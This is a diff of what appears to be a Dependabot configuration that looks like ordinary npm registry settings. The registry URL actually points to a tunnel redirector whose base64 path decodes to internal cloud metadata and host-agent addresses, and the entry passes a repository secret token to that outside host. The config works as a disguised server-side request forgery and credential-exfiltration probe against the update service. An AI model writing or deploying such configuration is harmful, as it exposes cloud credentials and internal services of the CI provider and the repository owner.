@@ -1,8 +1,8 @@
 version: 2
 registries:
-  p_imds:
+  p_8084:
     type: npm-registry
-    url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw
+    url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cDovLzE2OC42My4xMjkuMTY6ODA4NC8
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
@@ -10,4 +10,4 @@ updates:
     directory: "/"
     schedule: {interval: "daily"}
     registries: "*"
-# solo p_imds 203436Z
+# solo p_8084 203710Z
